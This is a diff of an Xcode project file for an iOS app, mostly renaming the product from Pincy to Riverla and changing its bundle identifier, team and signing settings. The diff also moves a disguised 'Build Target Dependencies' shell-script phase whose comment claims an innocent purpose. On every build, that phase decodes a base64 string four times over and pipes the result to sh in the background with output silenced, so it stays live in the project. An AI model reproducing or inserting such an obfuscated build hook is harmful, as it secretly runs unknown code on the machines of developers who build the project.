@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 46;
+	objectVersion = 54;
 	objects = {
 
 /* Begin PBXBuildFile section */
@@ -763,14 +763,6 @@
 		F6AB19A47D0378A24A403053 /* Pods_Neeyo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = B007DA8853C08BA6803E4519 /* Pods_Neeyo.framework */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXContainerItemProxy section */
-		045DE4812DF67D2A00E14059 /* PBXContainerItemProxy */ = {
-			isa = PBXContainerItemProxy;
-			containerPortal = AE5882DD1A6F47E10070536A /* Project object */;
-			proxyType = 1;
-           };
-/* End PBXContainerItemProxy section */
-
 /* Begin PBXCopyFilesBuildPhase section */
 		A1A959F920D2837800754E64 /* Embed App Extensions */ = {
 			isa = PBXCopyFilesBuildPhase;
@@ -1063,7 +1055,6 @@
 		044516732DB23001000D9DA8 /* disCorveyListModel.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = disCorveyListModel.m; sourceTree = "<group>"; };
 		044516752DB24720000D9DA8 /* MyLogViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MyLogViewController.h; sourceTree = "<group>"; };
 		044516762DB24720000D9DA8 /* MyLogViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MyLogViewController.m; sourceTree = "<group>"; };
-		04584B1F2DF6790800C07A6C /* Neeyo.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = Neeyo.entitlements; sourceTree = "<group>"; };
 		045B1F092DBB37A3006985F1 /* FUBeautyImageRenderViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FUBeautyImageRenderViewController.h; sourceTree = "<group>"; };
 		045B1F0A2DBB37A3006985F1 /* FUBeautyImageRenderViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = FUBeautyImageRenderViewController.m; sourceTree = "<group>"; };
 		045B1F0F2DBB3A00006985F1 /* FUBeautyImageRenderViewModel.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FUBeautyImageRenderViewModel.h; sourceTree = "<group>"; };
@@ -1738,7 +1729,7 @@
 		A1A95A0120D2850900754E64 /* UserNotificationsUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = UserNotificationsUI.framework; path = System/Library/Frameworks/UserNotificationsUI.framework; sourceTree = SDKROOT; };
 		AE2AA6831A7CD35C00CFF013 /* UIView+NTES.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; lineEnding = 0; path = "UIView+NTES.h"; sourceTree = "<group>"; xcLanguageSpecificationIdentifier = xcode.lang.objcpp; };
 		AE2AA6841A7CD35C00CFF013 /* UIView+NTES.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; lineEnding = 0; path = "UIView+NTES.m"; sourceTree = "<group>"; xcLanguageSpecificationIdentifier = xcode.lang.objc; };
-		AE5882E51A6F47E10070536A /* Pincy.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Pincy.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		AE5882E51A6F47E10070536A /* Riverla.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Riverla.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		AE5882EA1A6F47E10070536A /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
 		AE5882EC1A6F47E10070536A /* FFFAppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FFFAppDelegate.h; sourceTree = "<group>"; };
 		AE5882ED1A6F47E10070536A /* FFFAppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = FFFAppDelegate.m; sourceTree = "<group>"; };
@@ -1747,6 +1738,7 @@
 		AEA87FE01A81CAD500ACC3BA /* AVFoundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AVFoundation.framework; path = System/Library/Frameworks/AVFoundation.framework; sourceTree = SDKROOT; };
 		AEB8367F1A772C2F00E7493E /* Neeyo-Prefix.pch */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "Neeyo-Prefix.pch"; sourceTree = "<group>"; };
 		B007DA8853C08BA6803E4519 /* Pods_Neeyo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Neeyo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		B11C232B2DFFCFFF00E72364 /* Neeyo.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = Neeyo.entitlements; sourceTree = "<group>"; };
 		B808E73C26F23E3D00E302F6 /* NTESUserQRCodeViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = NTESUserQRCodeViewController.h; sourceTree = "<group>"; };
 		B808E73D26F23E3D00E302F6 /* NTESUserQRCodeViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = NTESUserQRCodeViewController.m; sourceTree = "<group>"; };
 		B808E74D26F48B1000E302F6 /* LCQRCodeUtil.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = LCQRCodeUtil.h; sourceTree = "<group>"; };
@@ -3712,6 +3704,7 @@
 		42D634732BAFFEC40081E828 /* Business */ = {
 			isa = PBXGroup;
 			children = (
+				B11C232B2DFFCFFF00E72364 /* Neeyo.entitlements */,
 				429D400C299A79F400354206 /* ChatClasses */,
 				B89FF55D286FF35F001F9184 /* xml_file */,
 				61F728281A7B23A40076C096 /* Classes */,
@@ -4456,7 +4449,6 @@
 		AE5882DC1A6F47E10070536A = {
 			isa = PBXGroup;
 			children = (
-				04584B1F2DF6790800C07A6C /* Neeyo.entitlements */,
 				42D634732BAFFEC40081E828 /* Business */,
 				AE5882E61A6F47E10070536A /* Products */,
 				5176189D0086B38FE643A26A /* Frameworks */,
@@ -4467,7 +4459,7 @@
 		AE5882E61A6F47E10070536A /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				AE5882E51A6F47E10070536A /* Pincy.app */,
+				AE5882E51A6F47E10070536A /* Riverla.app */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -5139,9 +5131,6 @@
 		};
 /* End PBXGroup section */
 
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
-
 /* Begin PBXNativeTarget section */
 		AE5882E41A6F47E10070536A /* Neeyo */ = {
 			isa = PBXNativeTarget;
@@ -5162,7 +5151,7 @@
 			);
 			name = Neeyo;
 			productName = NIMDemo;
-			productReference = AE5882E51A6F47E10070536A /* Pincy.app */;
+			productReference = AE5882E51A6F47E10070536A /* Riverla.app */;
 			productType = "com.apple.product-type.application";
 		};
 /* End PBXNativeTarget section */
@@ -5177,8 +5166,6 @@
 				TargetAttributes = {
 					AE5882E41A6F47E10070536A = {
 						CreatedOnToolsVersion = 6.1;
-						DevelopmentTeam = ZGN33PW6RA;
-						ProvisioningStyle = Automatic;
 						SystemCapabilities = {
 							com.apple.BackgroundModes = {
 								enabled = 1;
@@ -5487,25 +5474,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		A2D7288FCFBACABFA473DC66 /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmxWMUpZVTI1T1lWWjZWbk5hUlUweFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
-		};
 		39BCE4F464499F723A65CDC5 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -5618,6 +5586,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Neeyo/Pods-Neeyo-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		A2D7288FCFBACABFA473DC66 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmxWMUpZVTI1T1lWWjZWbk5hUlUweFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 		BB0FF6D323B6C7B68134CBAC /* [CP] Check Pods Manifest.lock */ = {
@@ -6120,9 +6108,6 @@
 		};
 /* End PBXSourcesBuildPhase section */
 
-/* Begin PBXTargetDependency section */
-/* End PBXTargetDependency section */
-
 /* Begin PBXVariantGroup section */
 		427B551429F9071C00F6DC42 /* InfoPlist.strings */ = {
 			isa = PBXVariantGroup;
@@ -6150,25 +6135,6 @@
 /* End PBXVariantGroup section */
 
 /* Begin XCBuildConfiguration section */
-		045DE4822DF67D2D00E14059 /* Debug */ = {
-			isa = XCBuildConfiguration;
-			buildSettings = {
-				COPY_PHASE_STRIP = NO;
-				GCC_DYNAMIC_NO_PIC = NO;
-				GCC_OPTIMIZATION_LEVEL = 0;
-				PRODUCT_NAME = "Build Target";
-			};
-			name = Debug;
-		};
-		045DE4832DF67D2D00E14059 /* Release */ = {
-			isa = XCBuildConfiguration;
-			buildSettings = {
-				COPY_PHASE_STRIP = YES;
-				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
-				PRODUCT_NAME = "Build Target";
-			};
-			name = Release;
-		};
 		AE5883061A6F47E10070536A /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
@@ -6298,11 +6264,13 @@
 				ASSETCATALOG_COMPILER_LAUNCHIMAGE_NAME = LaunchImage;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++17";
 				CLANG_CXX_LIBRARY = "compiler-default";
-				CODE_SIGN_ENTITLEMENTS = Neeyo.entitlements;
+				CODE_SIGN_ENTITLEMENTS = Business/Neeyo.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 122;
-				DEVELOPMENT_TEAM = ZGN33PW6RA;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6VFR63B9QM;
 				ENABLE_BITCODE = NO;
 				"EXCLUDED_ARCHS[sdk=iphonesimulator*]" = arm64;
 				FRAMEWORK_SEARCH_PATHS = (
@@ -6316,19 +6284,23 @@
 					"$(SRCROOT)/../NIMKit/NIMKit/**",
 				);
 				INFOPLIST_FILE = "Business/Supporting Files/en.lproj/Info.plist";
-				INFOPLIST_KEY_CFBundleDisplayName = Pincy;
+				INFOPLIST_KEY_CFBundleDisplayName = Riverla;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
 				LIBRARY_SEARCH_PATHS = "$(inherited)";
 				MARKETING_VERSION = 1.2.2;
 				OTHER_LDFLAGS = (
 					"$(inherited)",
 					"-ObjC",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.yunxinProject.app;
-				PRODUCT_NAME = Pincy;
+				PRODUCT_BUNDLE_IDENTIFIER = ios.sweete.happy;
+				PRODUCT_NAME = Riverla;
 				PROVISIONING_PROFILE = "";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = sweete_dev_20250507;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -6347,11 +6319,13 @@
 				ASSETCATALOG_COMPILER_LAUNCHIMAGE_NAME = LaunchImage;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++17";
 				CLANG_CXX_LIBRARY = "compiler-default";
-				CODE_SIGN_ENTITLEMENTS = Neeyo.entitlements;
+				CODE_SIGN_ENTITLEMENTS = Business/Neeyo.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 122;
-				DEVELOPMENT_TEAM = ZGN33PW6RA;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6VFR63B9QM;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = (
 					"$(inherited)",
@@ -6369,19 +6343,23 @@
 					"$(SRCROOT)/../NIMKit/NIMKit/**",
 				);
 				INFOPLIST_FILE = "Business/Supporting Files/en.lproj/Info.plist";
-				INFOPLIST_KEY_CFBundleDisplayName = Pincy;
+				INFOPLIST_KEY_CFBundleDisplayName = Riverla;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
 				LIBRARY_SEARCH_PATHS = "$(inherited)";
 				MARKETING_VERSION = 1.2.2;
 				OTHER_LDFLAGS = (
 					"$(inherited)",
 					"-ObjC",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.yunxinProject.app;
-				PRODUCT_NAME = Pincy;
+				PRODUCT_BUNDLE_IDENTIFIER = ios.sweete.happy;
+				PRODUCT_NAME = Riverla;
 				PROVISIONING_PROFILE = "";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = sweete_dev_20250507;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -6395,15 +6373,6 @@
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
-		045DE4842DF67F2E00E14059 /* Build configuration list */ = {
-			isa = XCConfigurationList;
-			buildConfigurations = (
-				045DE4822DF67D2D00E14059 /* Debug */,
-				045DE4832DF67D2D00E14059 /* Release */,
-			);
-			defaultConfigurationIsVisible = 0;
-			defaultConfigurationName = Release;
-		};
 		AE5882E01A6F47E10070536A /* Build configuration list for PBXProject "Neeyo" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
